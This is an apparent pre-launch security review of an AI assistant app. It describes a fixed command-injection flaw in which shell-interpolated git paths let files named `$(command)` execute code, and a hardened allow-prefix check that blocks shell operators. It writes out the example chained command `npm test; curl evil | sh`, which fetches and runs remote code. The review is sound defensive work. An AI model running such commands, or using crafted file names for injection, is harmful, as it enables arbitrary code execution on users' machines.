# Security review — 2026-07-31 (pre-launch)

Focused pass over the privileged surfaces added by the parity program:
command execution, file writes, MCP process spawning, the artifact harness,
and IPC. One high-severity issue found and fixed; one hardening applied.

## Findings

### H — Command injection via shell-interpolated git arguments (FIXED)
`GitService.diff` built `git diff -- "<path>"` and ran it through a **shell**
with the path interpolated (`JSON.stringify`, which does not neutralise `$(…)`
or backticks). On a POSIX shell, double quotes do **not** stop command
substitution, so a repository containing a file literally named `$(command)`
(or `` `command` ``) would execute `command` the moment its diff was shown —
and `git_status` / `git_diff` / `git_log` **auto-run** (no approval gate). That
turns "open a hostile repo and click a file / let the agent read status" into
arbitrary code execution.

**Fix:** all git operations now run via an **argument vector with no shell**
(`runFile('git', [...])`), so paths and commit messages are passed to git
verbatim and can never reach a shell. `run_command` remains shell-based by
design — it is the terminal feature, it is gated, and the user sees and approves
the exact command. Proved by `runFile` passing `$(…)`/`;` as literal argv
(tests/unit/command-runner.test.ts).

### M — Weak allow-prefix let chained commands auto-run (HARDENED)
A user who chose "always allow commands starting with `npm test`" would also
auto-run `npm test; curl evil | sh`, because the match was a bare `startsWith`.
**Fix:** `commandMatchesAllowedPrefix` now requires a clean prefix match on a
word boundary AND rejects any command containing shell control operators
(`; & | ` `` ` `` > $( && ||`), falling back to a manual gate otherwise
(src/shared/command-safety.ts, unit-tested).

## Reviewed and found sound (no change)
- **File reads/writes** are confined to the dialog-chosen workspace root via
  `realpath` on both root and target (parent for new files) — `..` and symlink
  escapes are rejected; every write is gated and checkpointed.
- **Artifact harness**: strict `default-src 'none'` meta CSP (no network), opaque
  sandbox without `allow-same-origin`, source-identity postMessage checks, and a
  single hash-pinned inline script — proved by the no-egress + sandbox e2e.
- **MCP**: servers are spawned only from user-entered config; tool arguments
  travel as JSON-RPC params (never a shell); each call is gated.
- **IPC**: every channel is zod-validated; the renderer cannot supply a provider
  base URL or a workspace root; API keys live in the OS keychain and are never
  returned to the renderer.
- **Model output** is DOMPurify-sanitised before render; the secret scanner
  gates outbound messages that look like credentials.

Net: 280 unit + full e2e green after the fixes.
